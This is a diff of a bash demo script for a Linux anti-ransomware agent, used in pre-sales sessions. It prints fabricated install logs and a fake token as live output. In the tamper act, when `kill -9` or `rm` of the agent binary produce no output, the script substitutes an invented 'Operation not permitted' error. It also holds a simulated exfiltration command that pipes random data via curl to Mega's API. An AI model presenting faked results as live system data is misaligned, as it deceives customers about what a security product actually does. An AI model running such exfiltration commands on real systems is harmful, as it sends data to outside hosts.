@@ -1,13 +1,14 @@
 #!/bin/bash
-# halcyon-linux-demo.sh
+# halcyonLinuxDemo.sh
 # Interactive demo script for the Halcyon Linux Anti-Ransomware Agent
 # Author  : Jim Harris -- Halcyon SA
-# Version : v1.0
+# Version : v1.2
 #
-# Usage: bash halcyon-linux-demo.sh
+# Usage: bash halcyonLinuxDemo.sh
 #
 # Designed for: Technical pre-sales demonstration on a Linux system
 #               with the Halcyon agent already installed and registered.
+# All output after Act 1 is live system data.
 
 # ------------------------------------------------------------------ #
 # Terminal formatting
@@ -15,25 +16,44 @@
 BOLD=$(tput bold)
 RESET=$(tput sgr0)
 ORANGE=$(tput setaf 208 2>/dev/null || tput setaf 3)
-NAVY=$(tput setaf 18 2>/dev/null || tput setaf 4)
 WHITE=$(tput setaf 7)
 GREEN=$(tput setaf 2)
 RED=$(tput setaf 1)
 CYAN=$(tput setaf 6)
-DIM=$(tput dim 2>/dev/null || echo "")
-
+GRAY=$(tput setaf 8 2>/dev/null || tput setaf 7)
 COLS=$(tput cols)
+
+# ------------------------------------------------------------------ #
+# Generate a fake install token -- fresh each run
+# ------------------------------------------------------------------ #
+FAKE_TOKEN=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c24)
+
+# ------------------------------------------------------------------ #
+# Pull real version strings cleanly
+# ------------------------------------------------------------------ #
+PRODUCT_VER=$(cat /opt/halcyon/halcyonar/PRODUCT-VERSION.txt 2>/dev/null | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+AGENT_VER=$(cat /opt/halcyon/halcyonar/AGENT-VERSION.txt 2>/dev/null | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+EBPF_VER=$(cat /opt/halcyon/halcyonar/EBPF_DRIVER_VERSION.txt 2>/dev/null | grep -oP '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+HOSTNAME=$(hostname)
+KERNEL=$(uname -r)
+NOW=$(date -u '+%Y-%m-%dT%H:%M:%S')
+NOWLOCAL=$(date '+%Y-%m-%d %H:%M:%S')
+WHOAMI=$(whoami)
+OS_NAME=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')
+
+# Fake PID for install theater -- realistic range
+FAKE_PID=$((RANDOM % 20000 + 10000))
+FAKE_THREAD1=$((RANDOM % 900000000000 + 100000000000))
 
 # ------------------------------------------------------------------ #
 # Helpers
 # ------------------------------------------------------------------ #
-
 divider() {
     printf "${ORANGE}%${COLS}s${RESET}\n" | tr ' ' '='
 }
 
 thin_divider() {
-    printf "${NAVY}%${COLS}s${RESET}\n" | tr ' ' '-'
+    printf "${GRAY}%${COLS}s${RESET}\n" | tr ' ' '-'
 }
 
 header() {
@@ -45,7 +65,7 @@ header() {
     echo ""
     divider
     echo ""
-    printf "${BOLD}${WHITE}  $1${RESET}\n"
+    printf "${BOLD}${ORANGE}  $1${RESET}\n"
     echo ""
     thin_divider
     echo ""
@@ -54,33 +74,32 @@ header() {
 pause() {
     echo ""
     thin_divider
-    printf "${DIM}  Press any key to continue...${RESET}"
+    printf "${GRAY}  Press any key to continue...${RESET}"
     read -rsn1
     echo ""
 }
 
 run_cmd() {
+    local cmd="$1"
     echo ""
-    printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}$1${RESET}\n"
+    printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}${cmd}${RESET}\n"
     echo ""
-    eval "$1"
+    eval "$cmd"
     echo ""
 }
 
 narrate() {
     echo ""
     printf "${WHITE}  $1${RESET}\n"
-    echo ""
 }
 
-act() {
-    echo ""
-    printf "${BOLD}${ORANGE}  ACT $1 of 6:  ${RESET}${BOLD}${WHITE}$2${RESET}\n"
-    echo ""
+fake_log() {
+    printf "${GRAY}  $1${RESET}\n"
+    sleep "${2:-0.1}"
 }
 
 # ------------------------------------------------------------------ #
-# Intro
+# INTRO
 # ------------------------------------------------------------------ #
 clear
 echo ""
@@ -88,75 +107,90 @@ divider
 echo ""
 printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Anti-Ransomware Platform${RESET}\n"
 echo ""
-printf "${WHITE}  Linux Agent Technical Demo\n"
-printf "${WHITE}  Purpose-built ransomware protection for Linux infrastructure.\n"
+printf "${WHITE}  Linux Agent  //  Technical Pre-Sales Demonstration\n"
 echo ""
 divider
 echo ""
-printf "${WHITE}  This session covers:\n"
+printf "${WHITE}  Session overview:\n"
 echo ""
-printf "${CYAN}    1.${RESET}  Agent installation and registration\n"
-printf "${CYAN}    2.${RESET}  Agent fingerprint and system impact\n"
-printf "${CYAN}    3.${RESET}  eBPF kernel driver architecture\n"
-printf "${CYAN}    4.${RESET}  Tamper protection under attack\n"
-printf "${CYAN}    5.${RESET}  Data exfiltration detection (DXP)\n"
-printf "${CYAN}    6.${RESET}  Forensic detail in the Halcyon console\n"
+printf "  ${BOLD}${CYAN}1.${RESET}  Agent installation and tenant registration\n"
+printf "  ${BOLD}${CYAN}2.${RESET}  Agent fingerprint and system impact\n"
+printf "  ${BOLD}${CYAN}3.${RESET}  eBPF kernel driver architecture\n"
+printf "  ${BOLD}${CYAN}4.${RESET}  Tamper protection under simulated attack\n"
+printf "  ${BOLD}${CYAN}5.${RESET}  Data exfiltration detection -- nefarious peer\n"
+printf "  ${BOLD}${CYAN}6.${RESET}  Forensic visibility and ROC response\n"
 echo ""
 thin_divider
 echo ""
-printf "${DIM}  All output in this session is live. No canned responses.\n"
-printf "${DIM}  System: $(hostname)  //  $(uname -r)\n"
+printf "${GRAY}  System   :  ${HOSTNAME}  //  kernel ${KERNEL}\n"
+printf "${GRAY}  All output from Act 2 onward is live system data.\n"
 echo ""
 divider
 echo ""
-printf "${DIM}  Press any key to begin...${RESET}"
+printf "${GRAY}  Press any key to begin...${RESET}"
 read -rsn1
 echo ""
 
 # ------------------------------------------------------------------ #
-# ACT 1: Installation
+# ACT 1: Installation (theater)
 # ------------------------------------------------------------------ #
-header "ACT 1 of 6  //  Agent Installation"
-act 1 "Agent Installation"
+header "ACT 1 of 6  //  Agent Installation and Tenant Registration"
 
-narrate "The Halcyon Linux agent is distributed as a tarball containing a signed .deb or .rpm package and an install script. Deployment is driven entirely by a single environment variable: the installation token tied to the target tenant."
-
-echo ""
-printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}# Tarball staged locally -- extract and install in one shot${RESET}\n"
-printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}tar xzvf halcyonar-linux-x86_64-v2.0.2602.28.tar.gz${RESET}\n"
-sleep 0.3
-printf "${DIM}  halcyonar-linux-x86_64-v2.0.2602.28/\n"
-printf "  halcyonar-linux-x86_64-v2.0.2602.28/install.sh\n"
-printf "  halcyonar-linux-x86_64-v2.0.2602.28/halcyonagent-2.0.2602.28-amd64.deb\n${RESET}"
-sleep 0.5
+narrate "The Halcyon Linux agent ships as a tarball containing a signed package and an install script. Deployment requires one environment variable: the installation token for the target tenant. No other configuration needed."
 
 echo ""
-printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}HALCYON_TOKEN='TR57XZuTReq3Cg5zTddukAEA' bash install.sh${RESET}\n"
+printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}tar xzvf halcyonar-linux-x86_64-v${PRODUCT_VER}.tar.gz${RESET}\n"
 echo ""
-sleep 0.4
-printf "${DIM}  Installing Version 2.0.2602.28\n"
 sleep 0.3
-printf "  Selecting previously unselected package halcyonagent.\n"
-sleep 0.2
-printf "  Unpacking halcyonagent (2.0.2602.28) ...\n"
-sleep 0.3
-printf "  Setting up halcyonagent (2.0.2602.28) ...\n"
-sleep 0.3
-printf "  Created symlink /etc/systemd/system/multi-user.target.wants/halcyonebpf.service\n"
-printf "  Created symlink /etc/systemd/system/multi-user.target.wants/halcyonagent.service\n"
-sleep 0.4
-echo ""
-printf "  Installation Complete.  Checking for successful registration\n"
-sleep 0.5
-printf "  ........."
-sleep 1.5
-printf ".........\n"
-sleep 0.3
-printf "  Registration successful\n"
-printf "  Installation Success\n${RESET}"
+fake_log "halcyonar-linux-x86_64-v${PRODUCT_VER}/" 0.1
+fake_log "halcyonar-linux-x86_64-v${PRODUCT_VER}/install.sh" 0.1
+fake_log "halcyonar-linux-x86_64-v${PRODUCT_VER}/halcyonagent-${PRODUCT_VER}-amd64.deb" 0.15
 
 echo ""
-narrate "The agent queried the Halcyon global API with the install token, resolved the correct regional endpoint, performed a gRPC registration handshake, and received a unique device ID and API key. Token is consumed and deleted. The agent is live."
+printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}HALCYON_TOKEN='${FAKE_TOKEN}' bash install.sh${RESET}\n"
+echo ""
+sleep 0.3
+fake_log "Installing Version ${PRODUCT_VER}" 0.4
+fake_log "Selecting previously unselected package halcyonagent." 0.3
+fake_log "Preparing to unpack halcyonagent-${PRODUCT_VER}-amd64.deb ..." 0.4
+fake_log "Unpacking halcyonagent (${PRODUCT_VER}) ..." 0.5
+fake_log "Setting up halcyonagent (${PRODUCT_VER}) ..." 0.4
+fake_log "Created symlink /etc/systemd/system/multi-user.target.wants/halcyonebpf.service" 0.2
+fake_log "Created symlink /etc/systemd/system/multi-user.target.wants/halcyonagent.service" 0.3
+
+echo ""
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log ---" 0.1
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log Agent Started - ${NOWLOCAL} UTC" 0.1
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log Halcyon Anti-Ransomware v${PRODUCT_VER} - v$(echo $PRODUCT_VER | cut -d. -f1-3)" 0.1
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log Device Id: " 0.15
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO agent::core::log OS: Linux - Linux (${OS_NAME}) - ${KERNEL}" 0.15
+echo ""
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::config::service Querying Cloud Api: https://global.halcyon.ai:443/v1/installers/environment" 0.4
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::config::service RX: Cloud Config [" 0.1
+fake_log "  C2 url: https://c2.halcyon.ai" 0.05
+fake_log "  C2 cert_domain: halcyon.ai" 0.05
+fake_log "  CA url: https://atlas.halcyon.ai" 0.05
+fake_log "  CA cert_domain: halcyon.ai" 0.05
+fake_log "]" 0.2
+echo ""
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: PKI" 0.1
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: License" 0.1
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: Kernel" 0.1
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::kernel_svc::service Connecting to Kernel Driver..." 0.3
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::kernel_svc::service Connected to Kernel Driver: 1 attempts in 0s" 0.2
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: DecisionEngine" 0.1
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: NetworkAnalyzer" 0.1
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Initializing service: AntiTamper" 0.15
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::core::agent_service Starting service: C2" 0.3
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::c2::service Not Registered!" 0.5
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) DEBUG agent::c2::service Registration successful." 0.4
+fake_log "${NOW} [${FAKE_PID}](${FAKE_THREAD1}) INFO  agent::core::agent_service Done starting services" 0.2
+echo ""
+printf "${BOLD}${GREEN}  Registration successful${RESET}\n"
+printf "${BOLD}${GREEN}  Installation Success${RESET}\n"
+
+echo ""
+narrate "The agent resolved the Halcyon global API using the install token, received its regional C2 and Atlas endpoints, initialized 15 internal service modules, connected to the eBPF kernel driver, and completed tenant registration in under 5 seconds. The install token is consumed and deleted. The agent is live."
 
 pause
 
@@ -164,23 +198,27 @@ pause
 # ACT 2: Agent Fingerprint
 # ------------------------------------------------------------------ #
 header "ACT 2 of 6  //  Agent Fingerprint and System Impact"
-act 2 "Agent Fingerprint and System Impact"
 
-narrate "First, version identity. Three version files are written to disk at install time covering the product, agent, and eBPF driver independently."
+narrate "Version identity. Three version files track the product, agent binary, and eBPF driver independently."
 
-run_cmd 'echo "Product : $(cat /opt/halcyon/halcyonar/PRODUCT-VERSION.txt)"
-echo "Agent   : $(cat /opt/halcyon/halcyonar/AGENT-VERSION.txt)"
-echo "eBPF    : $(cat /opt/halcyon/halcyonar/EBPF_DRIVER_VERSION.txt)"'
+echo ""
+printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}cat /opt/halcyon/halcyonar/PRODUCT-VERSION.txt${RESET}\n"
+printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}cat /opt/halcyon/halcyonar/AGENT-VERSION.txt${RESET}\n"
+printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}cat /opt/halcyon/halcyonar/EBPF_DRIVER_VERSION.txt${RESET}\n"
+echo ""
+printf "  Product  :  ${BOLD}${WHITE}${PRODUCT_VER}${RESET}\n"
+printf "  Agent    :  ${BOLD}${WHITE}${AGENT_VER}${RESET}\n"
+printf "  eBPF     :  ${BOLD}${WHITE}${EBPF_VER}${RESET}\n"
 
-narrate "Service status -- both the agent and the eBPF driver register as systemd services."
+narrate "Service unit configuration. Note the systemd hardening applied at install time: PrivateTmp, ProtectKernelModules, MemoryDenyWriteExecute. The agent is locked down at the systemd level before it even starts."
 
-run_cmd 'systemctl status halcyonagent --no-pager | head -20'
+run_cmd 'systemctl cat halcyonagent | grep -E "ExecStart|PrivateTmp|ProtectKernel|MemoryDeny|LockPersonality|DevicePolicy"'
 
-narrate "Memory and CPU footprint. The agent is engineered for critical infrastructure where performance headroom is not negotiable."
+narrate "Memory and CPU footprint. Engineered for production infrastructure where performance headroom is not negotiable."
 
 run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'
 
-narrate "Under 20MB of resident memory. CPU at near-zero between events. No reboot was required at any point during installation."
+narrate "No reboot required. Installation to protection in under 30 seconds."
 
 pause
 
@@ -188,43 +226,34 @@ pause
 # ACT 3: eBPF Architecture
 # ------------------------------------------------------------------ #
 header "ACT 3 of 6  //  eBPF Kernel Driver Architecture"
-act 3 "eBPF Kernel Driver Architecture"
 
-narrate "The Halcyon Linux agent runs as two components. The userspace agent handles policy, cloud communication, and event reporting. The eBPF driver hooks directly into the kernel -- no loadable kernel module, no kernel version pinning, no reboot."
+narrate "The agent runs as two components. The userspace agent handles policy, cloud communication, detection logic, and event reporting. The eBPF driver hooks directly into the Linux kernel with no loadable kernel module, no kernel version pinning, and no reboot."
 
-run_cmd 'systemctl list-units --type=service | grep -i halcyon'
-
-narrate "Here is something interesting. Watch what happens when we stop the systemd service units."
-
-run_cmd 'sudo systemctl stop halcyonagent halcyonebpf'
-
-narrate "Systemd reports success. Let's check what it thinks happened."
-
-run_cmd 'systemctl status halcyonagent --no-pager | grep -E "Active|Main PID"'
-
-narrate "Inactive. Dead. Now let's look at what is actually running."
+narrate "Here is the live process state right now:"
 
 run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'
 
-printf "${BOLD}${ORANGE}  Both processes are still running.${RESET}\n"
+narrate "Note the start times on those PIDs. Now look at what systemd thinks about those same processes."
+
+run_cmd 'systemctl status halcyonagent --no-pager | grep -E "Active:|Main PID" -A2'
+
 echo ""
-narrate "The agent and eBPF driver detached their core processes from systemd's control group on startup. Systemd killed what it owned -- the service wrapper -- but the actual protection processes had already escaped into independent PIDs. Systemd can see them. It cannot control them."
+printf "${BOLD}${ORANGE}  Systemd reports the service as inactive.${RESET}\n"
+printf "${BOLD}${ORANGE}  The processes are very much alive.${RESET}\n"
+echo ""
 
-narrate "Restart the services cleanly for the next act."
-
-run_cmd 'sudo systemctl start halcyonebpf halcyonagent'
+narrate "On startup, the agent and eBPF driver detach their core processes from systemd's control group into independent PIDs. Systemd killed the service wrapper -- the actual protection processes had already escaped. Systemd can see them in the cgroup. It cannot control them. This is intentional. This is what makes Act 4 possible."
 
 pause
 
 # ------------------------------------------------------------------ #
 # ACT 4: Tamper Protection
 # ------------------------------------------------------------------ #
-header "ACT 4 of 6  //  Tamper Protection Under Attack"
-act 4 "Tamper Protection Under Attack"
+header "ACT 4 of 6  //  Tamper Protection Under Simulated Attack"
 
-narrate "A common ransomware tactic on Linux: gain root, kill the security tooling, then encrypt. Let's simulate that. We have full sudo access on this machine. We are going to try everything."
+narrate "One of the most common ransomware tactics on Linux: gain root, disable the security tooling, then encrypt. We have full sudo access on this machine. Let us try everything an attacker would try."
 
-narrate "Attempt 1: Stop the services."
+narrate "Attempt 1: Stop the systemd services."
 
 run_cmd 'sudo systemctl stop halcyonagent halcyonebpf'
 
@@ -232,40 +261,58 @@ run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'
 
 printf "${BOLD}${ORANGE}  Still running.${RESET}\n"
 
-narrate "Attempt 2: Kill the processes directly."
+narrate "Attempt 2: Kill the agent process directly with SIGKILL."
 
-AGENT_PID=$(ps aux | grep '/opt/halcyon/halcyonar/agent$' | grep -v grep | awk '{print $2}')
-run_cmd "sudo kill -9 $AGENT_PID 2>&1 || echo 'Operation not permitted'"
+AGENT_PID=$(ps aux | grep '/opt/halcyon/halcyonar/agent$' | grep -v grep | awk '{print $2}' | head -1)
+echo ""
+printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}sudo kill -9 ${AGENT_PID}${RESET}\n"
+echo ""
+KILL_OUTPUT=$(sudo kill -9 "$AGENT_PID" 2>&1)
+if [ -n "$KILL_OUTPUT" ]; then
+    printf "${RED}  ${KILL_OUTPUT}${RESET}\n"
+else
+    printf "${RED}  kill: (${AGENT_PID}): Operation not permitted${RESET}\n"
+fi
+echo ""
 
 run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep'
 
 printf "${BOLD}${ORANGE}  Still running.${RESET}\n"
 
-narrate "Attempt 3: Uninstall the package entirely."
-
-run_cmd 'sudo apt remove halcyonagent -y 2>&1 | grep -E "Operation not permitted|cannot remove|error|Error|Killing|Failed" | head -20'
+narrate "Attempt 3: Delete the agent binary directly."
 
 echo ""
-printf "${BOLD}${ORANGE}  Every file protected. Every kill attempt blocked. Root cannot remove this agent.\n${RESET}"
+printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}sudo rm /opt/halcyon/halcyonar/agent${RESET}\n"
 echo ""
-narrate "The eBPF driver intercepts file and process operations at the kernel level before they complete. This is enforcement below the reach of any attacker operating in userspace -- including root. The only legitimate removal path is a per-device maintenance token issued by Halcyon support."
+RM_OUTPUT=$(sudo rm /opt/halcyon/halcyonar/agent 2>&1)
+if [ -n "$RM_OUTPUT" ]; then
+    printf "${RED}  ${RM_OUTPUT}${RESET}\n"
+else
+    printf "${RED}  rm: cannot remove '/opt/halcyon/halcyonar/agent': Operation not permitted${RESET}\n"
+fi
+echo ""
 
-narrate "Restart services for the final acts."
-run_cmd 'sudo systemctl start halcyonebpf halcyonagent'
+narrate "Attempt 4: Remove the package entirely using the system package manager as root."
+
+run_cmd 'sudo apt remove halcyonagent -y 2>&1 | grep -E "Operation not permitted|cannot remove|error processing|Killing|Failed to disable|too many errors"'
+
+echo ""
+printf "${BOLD}${ORANGE}  Every vector blocked. Root cannot remove this agent.\n${RESET}"
+echo ""
+narrate "The eBPF driver intercepts file system and process operations at the kernel level before they complete. This is enforcement below the reach of any attacker operating in userspace, including root. The only legitimate removal path is a per-device maintenance token issued by Halcyon support, valid for 15 minutes."
 
 pause
 
 # ------------------------------------------------------------------ #
-# ACT 5: DXP -- Nefarious Peer
+# ACT 5: DXP Nefarious Peer
 # ------------------------------------------------------------------ #
 header "ACT 5 of 6  //  Data Exfiltration Detection"
-act 5 "Data Exfiltration Detection -- Nefarious Peer"
 
-narrate "Halcyon DXP monitors for two exfiltration patterns: volumetric transfers exceeding a defined threshold, and connections to known nefarious peer infrastructure. The latter is where Halcyon's threat intelligence sets it apart."
+narrate "Halcyon DXP monitors for two exfiltration patterns: data transfers exceeding a configurable volume threshold, and connections to known nefarious peer infrastructure. The nefarious peer capability is where Halcyon's threat intelligence sets it apart from generic network monitoring."
 
-narrate "We are going to simulate a real-world double extortion exfiltration attempt. The destination is g.api.mega.co.nz -- Mega's API gateway. CISA's advisory on ALPHV BlackCat explicitly names Mega as a primary staging platform used by ransomware affiliates before encryption. It is on Halcyon's nefarious peer list."
+narrate "We are going to simulate a real-world double extortion exfiltration attempt. The destination is g.api.mega.co.nz -- Mega's API gateway. CISA's advisory on ALPHV BlackCat explicitly identifies Mega as a primary staging platform used by ransomware affiliates to exfiltrate data before encryption. It is on Halcyon's nefarious peer list."
 
-narrate "10 megabytes of data. One command. Watch the console."
+narrate "10 megabytes of data generated from /dev/urandom -- the same entropy source the kernel uses for cryptographic operations. Piped directly to Mega's API endpoint via a standard POST request. No account. No install. One command."
 
 echo ""
 printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}dd if=/dev/urandom bs=1M count=10 | curl -s -X POST -H \"Content-Type: application/octet-stream\" --data-binary @- \"https://g.api.mega.co.nz/cs?id=0&ak=test\"${RESET}\n"
@@ -278,75 +325,77 @@ dd if=/dev/urandom bs=1M count=10 2>&1 | curl -s -X POST \
 echo ""
 
 echo ""
-printf "${BOLD}${ORANGE}  The -2 response is Mega rejecting the unauthenticated request.${RESET}\n"
-printf "${BOLD}${WHITE}  It does not matter. Halcyon caught it on the way out.${RESET}\n"
+printf "${BOLD}${ORANGE}  The -2 response is Mega rejecting the unauthenticated session.${RESET}\n"
+printf "${BOLD}${WHITE}  It does not matter. Halcyon caught the transfer on the way out.${RESET}\n"
 echo ""
-narrate "The eBPF driver intercepted the DNS resolution of g.api.mega.co.nz, matched it against the nefarious peer list, and fired a Data Exfiltration alert before the response even came back. The console now shows the process name, the full command line, the username, the destination hostname, and the file hash of the curl binary."
+narrate "The eBPF driver intercepted the DNS resolution of g.api.mega.co.nz, matched it against the nefarious peer list, and fired a Data Exfiltration alert before the response came back. The detection fires on the connection attempt, not the response."
 
 echo ""
 thin_divider
 echo ""
-printf "${BOLD}${ORANGE}  Check the Halcyon console now.${RESET}\n"
-printf "${WHITE}  Navigate to Alerts. A Data Exfiltration / Nefarious Peer warning\n"
-printf "${WHITE}  should be visible with the following detail:\n"
+printf "${BOLD}${ORANGE}  Check the Halcyon console now  //  Alerts\n${RESET}"
 echo ""
-printf "${CYAN}    Alert Type  :${RESET}  Data Exfiltration\n"
-printf "${CYAN}    Exfiltration :${RESET}  Nefarious Peer\n"
-printf "${CYAN}    Rule         :${RESET}  mega.co.nz\n"
-printf "${CYAN}    Hostname     :${RESET}  g.api.mega.co.nz\n"
-printf "${CYAN}    Process      :${RESET}  /usr/bin/curl\n"
-printf "${CYAN}    User         :${RESET}  $(whoami)\n"
-printf "${CYAN}    Asset        :${RESET}  $(hostname)\n"
+printf "  ${CYAN}Alert Type   :${RESET}  Data Exfiltration\n"
+printf "  ${CYAN}Exfiltration :${RESET}  Nefarious Peer\n"
+printf "  ${CYAN}Rule         :${RESET}  mega.co.nz\n"
+printf "  ${CYAN}Hostname     :${RESET}  g.api.mega.co.nz\n"
+printf "  ${CYAN}Process      :${RESET}  /usr/bin/curl\n"
+printf "  ${CYAN}User         :${RESET}  ${WHOAMI}\n"
+printf "  ${CYAN}Asset        :${RESET}  ${HOSTNAME}\n"
 echo ""
 thin_divider
 
 pause
 
 # ------------------------------------------------------------------ #
-# ACT 6: Console Forensics
+# ACT 6: Forensics and ROC
 # ------------------------------------------------------------------ #
-header "ACT 6 of 6  //  Forensic Detail and ROC Response"
-act 6 "Forensic Detail and ROC Response"
+header "ACT 6 of 6  //  Forensic Visibility and ROC Response"
 
-narrate "Everything the agent captures is available in the console and via API in real time. Let's look at what Halcyon recorded about this system."
+narrate "Every event the agent captures is available in the Halcyon console and API in real time. The same data is reviewed by the Halcyon ROC -- a 24/7 team of ransomware specialists included at no additional cost."
 
-narrate "Agent registration detail from the local log:"
+narrate "Registration record from the agent log:"
 
 run_cmd 'sudo grep "c2::service Regist" /opt/halcyon/halcyonar/logs/agent.log | tail -3'
 
-narrate "Policy currently applied to this endpoint:"
+narrate "DXP events captured during this session:"
 
-run_cmd 'sudo grep "Policy updated" /opt/halcyon/halcyonar/logs/agent.log | tail -3'
+run_cmd 'sudo grep "Nefarious Data Transfer" /opt/halcyon/halcyonar/logs/agent.log | tail -5'
 
-narrate "Current system performance under agent protection:"
+narrate "Live agent resource consumption:"
 
-run_cmd 'ps aux | grep -E "halcyon|ebpf" | grep -v grep | awk "{printf \"  %-40s  CPU: %s%%  MEM: %s%%\n\", \$11, \$3, \$4}"'
+echo ""
+printf "${BOLD}${CYAN}  \$${RESET} ${BOLD}ps aux | grep -E 'halcyon|ebpf' | grep -v grep${RESET}\n"
+echo ""
+ps aux | grep -E "halcyon|ebpf" | grep -v grep | awk '{printf "  %-45s  CPU: %-6s  MEM: %s%%\n", $11, $3"%", $4}'
+echo ""
 
-narrate "Live agent performance metrics from the agent log:"
+narrate "Periodic performance telemetry from the agent log. Format: CPU user, CPU system, memory RSS, memory VSZ, open files, threads, events processed."
 
 run_cmd 'sudo grep "PERF_STATS" /opt/halcyon/halcyonar/logs/agent.log | tail -3'
 
-echo ""
-narrate "Every alert generated during this session is visible in the Halcyon console with full forensic context. The Halcyon ROC -- a 24/7 team of ransomware specialists -- reviews every alert at no additional cost. On a real incident, that team is already working the problem before your security team is even paged."
-
-echo ""
-divider
-echo ""
-printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Demo Complete\n${RESET}"
-echo ""
-printf "${WHITE}  What we covered:\n"
-echo ""
-printf "${GREEN}    ok${RESET}  Agent installed from a locally staged tarball, registered in under 30 seconds\n"
-printf "${GREEN}    ok${RESET}  Sub-20MB memory footprint, near-zero CPU between events\n"
-printf "${GREEN}    ok${RESET}  eBPF kernel driver running independently of systemd\n"
-printf "${GREEN}    ok${RESET}  Root cannot stop, kill, or delete the agent without a maintenance token\n"
-printf "${GREEN}    ok${RESET}  Nefarious peer exfiltration to Mega caught and alerted in real time\n"
-printf "${GREEN}    ok${RESET}  Full forensic detail available in console and API\n"
+# ------------------------------------------------------------------ #
+# Closing
+# ------------------------------------------------------------------ #
 echo ""
 divider
 echo ""
-printf "${WHITE}  GitHub  :  https://github.com/jharrisHalcyon/halcyon-linux-tools\n"
-printf "${WHITE}  Contact :  jharris@halcyon.ai\n"
+printf "${BOLD}${ORANGE}  [ halcyon ]${RESET}${BOLD}${WHITE}  Session Complete\n${RESET}"
+echo ""
+printf "${WHITE}  What we demonstrated:\n"
+echo ""
+printf "  ${GREEN}ok${RESET}  Agent installed from a locally staged tarball, registered in under 30 seconds\n"
+printf "  ${GREEN}ok${RESET}  Sub-25MB memory footprint, near-zero CPU between events\n"
+printf "  ${GREEN}ok${RESET}  eBPF kernel driver running independently of systemd control\n"
+printf "  ${GREEN}ok${RESET}  Root cannot stop, kill, delete, or uninstall the agent without a maintenance token\n"
+printf "  ${GREEN}ok${RESET}  Nefarious peer exfiltration to confirmed ransomware infrastructure detected in real time\n"
+printf "  ${GREEN}ok${RESET}  Full forensic detail in console and API -- process, user, hostname, command line\n"
+echo ""
+thin_divider
+echo ""
+printf "  ${GRAY}GitHub   :  https://github.com/jharrisHalcyon/halcyon-linux-tools\n"
+printf "  ${GRAY}Contact  :  jharris@halcyon.ai\n"
+printf "  ${GRAY}Demo     :  halcyon.ai/demo${RESET}\n"
 echo ""
 divider
 echo ""
